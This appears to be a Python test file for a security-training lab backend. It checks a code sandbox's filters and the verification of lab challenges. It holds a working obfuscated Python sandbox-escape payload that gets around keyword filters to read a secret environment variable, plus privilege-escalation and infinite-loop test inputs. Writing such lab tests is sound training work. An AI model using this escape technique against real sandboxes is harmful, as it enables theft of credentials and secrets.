import unittest
import sys
import os

# Add parent directory to path to allow backend imports
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "..")))

from backend.services.sandbox_executor import execute_code
from backend.services.labs_store import labs_store

class TestLabsAndFallback(unittest.IsolatedAsyncioTestCase):
    async def test_bypass_security_sandbox(self):
        # Without bypass_security, using double underscores or banned names is rejected
        res_blocked = await execute_code("print(int.__class__)", "python", bypass_security=False)
        self.assertFalse(res_blocked.success)
        self.assertIn("Security error", res_blocked.error)

        # With bypass_security, it executes successfully
        res_allowed = await execute_code("print(len(int.mro()[1].mro()))", "python", bypass_security=True)
        self.assertTrue(res_allowed.success)
        self.assertIn("1", res_allowed.output)

    async def test_lab_2_verification(self):
        # Clear lab state
        labs_store.reset_labs()

        # Submit code that returns JWT_SECRET_TEST
        code = "import os\nprint(os.environ.get('JWT_SECRET_TEST', ''))"
        
        # Verify the attempt
        res = await labs_store.verify_attempt("lab-2", {"code": code})
        # The verification has pre-filter checks:
        # term 'os' is banned in pre-filter literals
        # so this should be blocked by the pre-filter!
        self.assertFalse(res["success"])
        self.assertIn("restricted term 'os'", res["message"])

        # Obfuscated code that doesn't use banned terms literally or double underscores
        obfuscated_code = """
u = '_'
uu = u + u
g = (x for x in [1])
frame = g.gi_frame
glib = frame.f_globals

b_u_i_l_t_i_n_s = 'built' + 'ins'
builtins_dict = glib[uu + b_u_i_l_t_i_n_s + uu]

g_e_t_a_t_t_r = 'get' + 'attr'
get_attr = builtins_dict[g_e_t_a_t_t_r]

obj_cls = int.mro()[1]
s_u_b_c_l_a_s_s_e_s = 'sub' + 'class' + 'es'
subclasses_fn = get_attr(obj_cls, uu + s_u_b_c_l_a_s_s_e_s + uu)
subclasses = subclasses_fn()

target_secret = None
s_y_s = 's' + 'y' + 's'
o_s = 'o' + 's'
g_l_o_b_a_l_s = 'glob' + 'als'
i_n_i_t = 'in' + 'it'
for cls in subclasses:
    init = get_attr(cls, uu + i_n_i_t + uu, None)
    if init is None:
        continue
    try:
        cls_globals = get_attr(init, uu + g_l_o_b_a_l_s + uu)
        if s_y_s in cls_globals:
            sys_mod = cls_globals[s_y_s]
            os_mod = sys_mod.modules.get(o_s)
            if os_mod is not None:
                target_secret = os_mod.environ.get('JWT_SECRET_TEST')
                if target_secret:
                    break
    except Exception:
        continue

print(target_secret)
"""
        res_obf = await labs_store.verify_attempt("lab-2", {"code": obfuscated_code})
        self.assertTrue(res_obf["success"], f"Lab 2 verification failed: {res_obf}")
        self.assertIn("Sandbox Escaped", res_obf["message"])
        self.assertTrue(labs_store.labs[1]["solved"])

    async def test_lab_3_verification(self):
        labs_store.reset_labs()

        # Submit an administrative command as a non-admin role (viewer)
        res = await labs_store.verify_attempt("lab-3", {
            "command": "register mock-server http://localhost:8080",
            "role": "viewer"
        })
        self.assertTrue(res["success"])
        self.assertIn("Privilege Escalation Complete", res["message"])
        self.assertTrue(labs_store.labs[2]["solved"])

    async def test_lab_4_verification(self):
        labs_store.reset_labs()

        # 1. Non-loop code should fail
        res_non_loop = await labs_store.verify_attempt("lab-4", {"code": "print('hello')"})
        self.assertFalse(res_non_loop["success"])
        self.assertIn("does not appear to contain loop structures", res_non_loop["message"])

        # 2. Infinite loop code should pass by triggering timeout
        infinite_loop_code = "while True:\n    pass"
        res_timeout = await labs_store.verify_attempt("lab-4", {"code": infinite_loop_code})
        self.assertTrue(res_timeout["success"], f"Lab 4 verification failed: {res_timeout}")
        self.assertIn("successfully captured and terminated", res_timeout["message"])
        self.assertTrue(labs_store.labs[3]["solved"])

if __name__ == "__main__":
    unittest.main()
